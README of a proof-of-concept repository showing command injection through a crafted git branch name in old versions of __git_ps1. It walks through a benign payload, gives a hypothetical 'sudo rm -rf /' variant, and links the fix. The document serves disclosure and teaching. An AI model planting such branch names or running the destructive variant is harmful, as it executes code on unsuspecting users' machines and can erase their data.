clonepwn
========

The purpose of this repository is to demonstrate arbitrary code
execution after cloning a repository when using vulnerable versions of
`__git_ps1` in two- or three-argument mode.

Instructions
------------

If you are using bash:

  1. Get [`git-prompt.sh`](https://git.kernel.org/cgit/git/git.git/tree/contrib/completion/git-prompt.sh)
     from the [`git.git` repository](https://git.kernel.org/cgit/git/git.git)
     (in the `contrib/completion` subdirectory).

  2. Follow steps 1, 2, and 3b at the top of the `git-prompt.sh` file.

  3. Clone this repository:

        git clone https://github.com/richardhansen/clonepwn.git

  4. `cd` into the new `clonepwn` directory.

If you are using a vulnerable version of `__git_ps1` (and your
username is `username`), you will see the following text in your
prompt:

    hello username, you are vulnerable to clonepwn

Otherwise, you will see the following:

    $(IFS=_;cmd=echo_hello_$USER,_you_are_not_vulnerable_to_clonepwn;cmd2=sed_-e_s/not.v/v/;$cmd|$cmd2)

How It Works
------------

The default branch in this repository is not `master`—it has an
unusual name:

    $(IFS=_;cmd=echo_hello_$USER,_you_are_not_vulnerable_to_clonepwn;cmd2=sed_-e_s/not.v/v/;$cmd|$cmd2)

This name is also valid shell code.  Old versions of the `__git_ps1`
function set `PS1` (the variable that holds your prompt) in a way that
causes the code to be interpreted by the shell.  This causes the
following to happen:

  1. The shell sets the `IFS` variable to `_`.  This causes the shell
     to break words with underscores into multiple fields.  This makes
     it possible to pass arguments to commands (Git does not permit
     whitespace in branch names).

  2. The shell sets the `cmd` variable to:

        echo_hello_username,_you_are_not_vulnerable_to_clonepwn

  3. The shell sets the `cmd2` variable to:

        sed_-e_s/not.v/v/

  4. The shell runs `$cmd|$cmd2`.  Because `IFS` is set to an
     underscore, this gets expanded like:

        echo hello username, you are not vulnerable to clonepwn|sed -e s/not.v/v/

     This runs the `echo` command with the arguments `hello`,
     `username,`, `you`, `are`, `not`, `vulnerable`, `to`, and
     `clonepwn`, which, as you might expect, prints the following
     string:

        hello username, you are not vulnerable to clonepwn

     The pipe symbol (`|`) tells the shell to feed `echo`'s output to
     this `sed` command:

        sed -e s/not.v/v/

     Those arguments to `sed` cause it to replace `not v` with `v` (it
     removes the word `not`), and print the result:

        hello username, you are vulnerable to clonepwn

  5. The shell captures the above output of `sed` (because of the
     `$(...)` construct), and the entire `$(...)` string is replaced
     with:

        hello username, you are vulnerable to clonepwn

  6. `__git_ps1` shows the above string as the branch name instead of
     the true branch name.

Note that the above code is benign, but it could have been malicious.
For example, if the branch had been named
`$(IFS=_;cmd=sudo_rm_-rf_/;$cmd)` then some real damage could have
been done (erase your hard drive).

The Fix
-------

The version of `__git_ps1` that comes with Git v1.9.3 and later have
been fixed.  If you are using an older version, apply the following
two patches to `git-prompt.sh`:

  * [the fix](https://git.kernel.org/cgit/git/git.git/commit/?id=8976500cbbb13270398d3b3e07a17b8cc7bff43f)
  * [the fix to the fix](https://git.kernel.org/cgit/git/git.git/commit/?id=1e4119c81b3e203e1729e03be6e4a53eb9207f5c) (the fix introduced a regression for zsh users; this patch fixes that regression)

You may be interested in the [mailing list
thread](http://thread.gmane.org/gmane.comp.version-control.git/246629)
where this fix was discussed.
